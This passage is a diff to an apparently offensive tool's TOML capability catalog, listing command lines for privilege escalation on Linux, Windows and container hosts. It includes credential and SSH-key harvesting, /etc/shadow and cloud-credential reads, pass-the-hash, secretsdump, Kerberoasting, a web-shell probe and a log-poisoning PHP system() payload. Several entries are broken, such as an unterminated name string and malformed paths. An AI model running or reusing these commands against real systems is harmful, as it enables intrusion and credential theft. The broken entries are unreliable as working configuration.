+[[capability.provider.operation]]
+name = 'Kernel Image Listing'
+args = ['-la', '/boot/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Remote Kernel Banner'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'kernel_info']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.container-escape'
+phase = 'escalation'
+label = 'CONTAINER ESCAPE'
+summary = 'Detect containerization and probe breakout vectors'
+inputs = [
+  { key = 'socket', type = 'file', required = false, default = '/var/run/docker.sock' },
+]
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Docker Socket Check'
+args = ['-la', '{socket}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Dockerenv Check'
+args = ['/', '-name', '.dockerenv', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Cgroup Container Check'
+args = ['/proc/1/cgroup']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker API Info'
+args = ['-sk', '--unix-socket', '{socket}', 'http://localhost/info']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker API Containers'
+args = ['-sk', '--unix-socket', '{socket}', 'http://localhost/containers/json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Docker Host Mount Probe'
+args = ['-sk', '--unix-socket', '{socket}', 'http://localhost/containers/json?all=1']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Host Mount Check'
+args = ['/proc/mounts']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'K8s Service Account'
+args = ['/var/run/secrets/kubernetes.io/serviceaccount/token']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'K8s API Probe'
+args = ['-sk', '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt', '-H', 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)', 'https://kubernetes.default.svc/api']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'LXD Socket Check'
+args = ['-la', '/var/snap/lxd/common/lxd/unix.socket']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getent'
+[[capability.provider.operation]]
+name = 'Docker Group Check'
+args = ['group', 'docker']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'capsh'
+[[capability.provider.operation]]
+name = 'Container Capability Dump'
+args = ['--print']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.password-harvest'
+phase = 'escalation'
+label = 'PASSWORD HARVEST'
+summary = 'Harvest credentials from config files, history and logs'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+]
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Passwd Pattern Sweep'
+args = ['-riE', 'password|passwd|pwd', '{path}', '--include=*.conf', '--include=*.cfg', '--include=*.yml', '--include=*.env', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Db Connect Strings'
+args = ['-riE', 'jdbc|mysql://|postgres://|mongodb://', '{path}', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'History Files'
+args = ['{path}', '-name', '.*history', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Bash History Dump'
+args = ['{path}/*/.bash_history']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'SSH Config Harvest'
+args = ['{path}', '-name', 'config', '-path', '*/.ssh/*', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Env File Creds'
+args = ['-riE', '=.{4,}', '{path}/.env', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Shadow Attempt Read'
 args = ['/etc/shadow']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'ss'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'Elevated Ports'
-args = ['-tlnp']
+name = 'Automount Creds'
+args = ['/etc/auto.master', '/etc/auto.master.d/*']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Cloud Key Sweep'
+args = ['-riE', 'aws_secret|api_key|secret_key', '/var/www/', '/opt/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Backup Config Sweep'
+args = ['{path}', '-name', '*.bak', '-o', '-name', '*.old', '-o', '-name', '*.conf.*', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Hidden File Inventory'
+args = ['-la', '{path}/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Docker Compose Creds'
+args = ['-riE', 'password|secret', '{path}', '--include=docker-compose.yml', '--include=.env', '2>/dev/null']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.ssh-key-harvest'
+phase = 'escalation'
+label = 'SSH KEY HARVEST'
+summary = 'Locate and reuse SSH private keys and authorized keys'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+  { key = 'rhost', type = 'target', required = false, default = '127.0.0.1' },
+]
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Private Key Sweep'
+args = ['{path}', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-o', '-name', '*.pem', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'SSH Dir Inventory'
+args = ['{path}', '-name', '.ssh', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'SSH Dir Listing'
+args = ['-la', '{path}/*/.ssh/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Authorized Keys Read'
+args = ['{path}/*/.ssh/authorized_keys']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Root Key Read'
+args = ['/root/.ssh/authorized_keys']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Key Format Verify'
+args = ['{path}/*/.ssh/id_rsa']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh-keygen'
+[[capability.provider.operation]]
+name = 'Key Fingerprint'
+args = ['-l', '-f', '{path}/.ssh/id_rsa']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Auth Probe'
+args = ['-i', '{path}/.ssh/id_rsa', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '{rhost}', 'id']
 output = 'lines'
 network = true
 [[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Known Hosts Map'
+args = ['-h', '{path}/*/.ssh/known_hosts']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'SSH Client Config'
+args = ['{path}/*/.ssh/config']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Encrypted Key Detect'
+args = ['{path}', '-name', 'id_rsa', '-type', 'f', '-exec', 'grep', '-l', 'ENCRYPTED', '{}', ';', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Root SSH Listing'
+args = ['-la', '/root/.ssh/']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.windows-service-hijack'
+phase = 'escalation'
+label = 'WINDOWS SERVICE HIJACK'
+summary = 'Enumerate and abuse weakly configured Windows services'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'payload', type = 'file', required = false, default = 'rev.exe' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Service Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'services']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Unquoted Path Scan'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'unquoted_path']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Writable Service Path'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-smbclient'
+[[capability.provider.operation]]
+name = 'Admin Share Listing'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Payload Drop C$
+args = []
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'Service Shell Test'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'WMIC Shell Test'
+args = ['{rhost}/{username}:{password}', 'sc query state= all']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'AlwaysInstallElevated'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'always_install_elevated']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'AutoLogon Creds'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'autologon']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Local Group Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--local-groups']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Logged On Users'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'loggedon']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Service Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--services']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.token-impersonation'
+phase = 'escalation'
+label = 'TOKEN IMPERSONATION'
+summary = 'Enumerate domain tokens and impersonate privileged principals'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Domain Info Pull'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--users']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Group Membership Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--groups']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Pass-the-Hash Test'
+args = ['smb', '{rhost}', '-u', 'administrator', '-H', 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-secretsdump'
+[[capability.provider.operation]]
+name = 'Credential Dump'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Shell Via WMI'
+args = ['{rhost}/{username}:{password}', 'whoami /priv']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getST'
+[[capability.provider.operation]]
+name = 'Kerberos Ticket Request'
+args = ['{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Kerberoastable Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--kerberoasting', 'kerberoast.out']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'ASREProast Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--asreproast', 'asrep.out']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Delegation Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--delegate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'GMSA Dump'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--gmsa']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Shares Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-lookupsid'
+[[capability.provider.operation]]
+name = 'SID Brute'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.writable-file-abuse'
+phase = 'escalation'
+label = 'WRITABLE FILE ABUSE'
+summary = 'Enumerate writable sensitive files and system paths'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable Etc Files'
+args = ['/etc/', '-writable', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable Root Dirs'
+args = ['/', '-maxdepth', '3', '-writable', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Passwd File Perms'
+args = ['-la', '/etc/passwd', '/etc/shadow', '/etc/group']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Passwd Stat Detail'
+args = ['-c', '%a %U %G %n', '/etc/passwd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'World Writable Files'
+args = ['/', '-type', 'f', '-perm', '-0002', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Group Writable Root'
+args = ['/', '-type', 'f', '-perm', '-0020', '-user', 'root', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Motd Hook Check'
+args = ['-la', '/etc/update-motd.d/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Profile Dir Perms'
+args = ['-la', '/etc/profile.d/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Sticky World Writable Dirs'
+args = ['/', '-type', 'd', '-perm', '-0002', '-not', '-perm', '-1000', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Tmp Perms Check'
+args = ['-la', '/tmp/', '/var/tmp/', '/dev/shm/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Passwd Content Check'
+args = ['/etc/passwd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Root Sudo Group Check'
+args = ['-E', 'sudo|wheel|admin', '/etc/group']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.environment-leak'
+phase = 'escalation'
+label = 'ENVIRONMENT LEAK'
+summary = 'Extract secrets and hints from environment, shell and proc'
+inputs = [
+  { key = 'pid', type = 'port', required = false, default = '1' },
+]
+[[capability.provider]]
+binary = 'printenv'
+[[capability.provider.operation]]
+name = 'Full Environment Dump'
+args = []
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'printenv'
+[[capability.provider.operation]]
+name = 'Secret Var Filter'
+args = ['KEY', 'TOKEN', 'SECRET', 'PASS']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Proc Environment Read'
+args = ['/{pid}/environ']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Proc Cmdline Read'
+args = ['/{pid}/cmdline']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Docker Env Leak'
+args = ['/proc/1/environ']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Shell RC Secrets'
+args = ['-riE', 'export.*(key|token|pass|secret)', '/home/*/.bashrc', '/home/*/.profile', '/home/*/.zshrc', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Netrc Read'
+args = ['/home/*/.netrc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Git Credentials Read'
+args = ['/home/*/.git-credentials']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'AWS Config Read'
+args = ['/home/*/.aws/credentials']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Proc Cmdline Root'
+args = ['/proc/1/cmdline']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Proc Inventory'
+args = ['la', '/proc/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'env'
+[[capability.provider.operation]]
+name = 'Env Compare'
+args = []
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.nfs-squash'
+phase = 'escalation'
+label = 'NFS SQUASH'
+summary = 'Probe NFS exports for no_root_squash and mount abuse'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'showmount'
+[[capability.provider.operation]]
+name = 'Export Enumeration'
+args = ['-e', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'showmount'
+[[capability.provider.operation]]
+name = 'Mount List'
+args = ['-a', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'showmount'
+[[capability.provider.operation]]
+name = 'Export Dir Listing'
+args = ['-d', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'rpcinfo'
+[[capability.provider.operation]]
+name = 'RPC Service Enum'
+args = ['-p', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'NFS Script Scan'
+args = ['-sV', '-p', '111,2049', '--script', 'nfs-showmount,nfs-ls', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mkdir'
+[[capability.provider.operation]]
+name = 'Mount Point Prep'
+args = ['-p', '/tmp/tsmnt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'mount'
+[[capability.provider.operation]]
+name = 'NFS Mount Probe'
+args = ['-t', 'nfs', '{rhost}:/', '/tmp/tsmnt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Mounted Content List'
+args = ['-la', '/tmp/tsmnt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'RPCDump Script'
+args = ['-sV', '-p', '111', '--script', 'rpcinfo', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Local Exports Read'
+args = ['/etc/exports']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'umount'
+[[capability.provider.operation]]
+name = 'Mount Teardown'
+args = ['/tmp/tsmnt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'NFS Version Probe'
+args = ['-sV', '-p', '2049', '{rhost}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.smb-share-privilege'
+phase = 'escalation'
+label = 'SMB SHARE PRIVILEGE'
+summary = 'Map share permissions and abuse writable SMB shares'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Share Enum'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Anonymous Share Probe'
+args = ['smb', '{rhost}', '-u', 'guest', '-p', '', '--shares']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'smbclient'
+[[capability.provider.operation]]
+name = 'Null Session List'
+args = ['-L', '//{rhost}/', '-N']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'smbclient'
+[[capability.provider.operation]]
+name = 'Share Content List'
+args = ['//{rhost}/c$', '-U', '{username}%{password}', '-c', 'ls']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'smbclient'
+[[capability.provider.operation]]
+name = 'Writable Share Test'
+args = ['//{rhost}/share', '-U', '{username}%{password}', '-c', 'put test.txt test.txt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'smbclient'
+[[capability.provider.operation]]
+name = 'Recursive Listing'
+args = ['//{rhost}/share', '-U', '{username}%{password}', '-c', 'recurse;ls']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Spider Shares'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spider_plus']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Sensitive File Hunt'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spider_plus', '-o', 'PATTERNS=passw,cred,secret,.env']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'rpcclient'
+[[capability.provider.operation]]
+name = 'Share Level Enum'
+args = ['{rhost}', '-U', '{username}%{password}', '-c', 'netshareenum']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'rpcclient'
+[[capability.provider.operation]]
+name = 'Null Session Info'
+args = ['{rhost}', '-U', '', '-c', 'querydominfo']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'SMB Script Sweep'
+args = ['-sV', '-p', '445', '--script', 'smb-enum-shares,smb-vuln-*', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'enum4linux-ng'
+[[capability.provider.operation]]
+name = 'Full Enum Pass'
+args = ['-A', '{rhost}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.database-cred-exfil'
+phase = 'escalation'
+label = 'DATABASE CRED EXFIL'
+summary = 'Abuse local database access for credential and data extraction'
+inputs = [
+  { key = 'db-host', type = 'target', required = false, default = '127.0.0.1' },
+  { key = 'db-user', type = 'username', required = false, default = 'root' },
+  { key = 'db-pass', type = 'password', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'mysql'
+[[capability.provider.operation]]
+name = 'MySQL Connect Probe'
+args = ['-h', '{db-host}', '-u', '{db-user}', '-p{db-pass}', '-e', 'select version();']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mysql'
+[[capability.provider.operation]]
+name = 'MySQL Database List'
+args = ['-h', '{db-host}', '-u', '{db-user}', '-p{db-pass}', '-e', 'show databases;']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mysql'
+[[capability.provider.operation]]
+name = 'MySQL User Hash Dump'
+args = ['-h', '{db-host}', '-u', '{db-user}', '-p{db-pass}', '-e', 'select user,authentication_string from mysql.user;']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'mysql'
+[[capability.provider.operation]]
+name = 'MySQL File Read'
+args = ['-h', '{db-host}', '-u', '{db-user}', '-p{db-pass}', '-e', 'select load_file("/etc/passwd");']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'psql'
+[[capability.provider.operation]]
+name = 'Postgres Connect Probe'
+args = ['-h', '{db-host}', '-U', '{db-user}', '-c', 'select version();']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'psql'
+[[capability.provider.operation]]
+name = 'Postgres Database List'
+args = ['-h', '{db-host}', '-U', '{db-user}', '-l']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'psql'
+[[capability.provider.operation]]
+name = 'Postgres COPY Read'
+args = ['-h', '{db-host}', '-U', '{db-user}', '-c', 'copy (select pg_read_file("/etc/passwd")) to stdout;']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Redis Info Probe'
+args = ['-h', '{db-host}', 'info']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Redis Config Dir'
+args = ['-h', '{db-host}', 'config', 'get', 'dir']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Redis Key Dump'
+args = ['-h', '{db-host}', 'keys', '*']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'DB Process Args'
+args = ['aux']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'DB Config Creds'
+args = ['-riE', 'password|user', '/etc/mysql/', '/etc/postgresql/', '2>/dev/null']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.web-root-write'
+phase = 'escalation'
+label = 'WEB ROOT WRITE'
+summary = 'Test web root writability for code execution escalation'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'path', type = 'file', required = false, default = 'probe.php' },
+]
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Web Root Writability'
+args = ['/var/www/', '/opt/lampp/htdocs/', '-writable', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Web Root Listing'
+args = ['-la', '/var/www/html/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Write Trigger Verify'
+args = ['-sk', '{url}/{path}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'PHP Info Check'
+args = ['-sk', '{url}/info.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Web Shell Probe'
+args = ['-sk', '{url}/shell.php?cmd=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Web Root Tech Fingerprint'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Upload Dir Probe'
+args = ['-sk', '{url}/uploads/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Admin Dir Probe'
+args = ['-sk', '{url}/admin/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Upload Surface Scan'
+args = ['-u', '{url}', '-tags', 'upload,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Web Root Content Discover'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,301,403', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CMS Admin Path Probe'
+args = ['-sk', '{url}/wp-admin/', '{url}/administrator/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Probe Artifact Verify'
+args = ['{path}']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.log-poisoning'
+phase = 'escalation'
+label = 'LOG POISONING'
+summary = 'Detect log injection potential for LFI-to-RCE chains'
+inputs = [
+  { key = 'log-path', type = 'file', required = false, default = '/var/log/apache2/access.log' },
+  { key = 'marker', type = 'text', required = false, default = 'tsprobe' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Poison Marker Inject'
+args = ['-sk', '-A', '{marker}<?php system($_GET[0]);?>', 'http://127.0.0.1/']
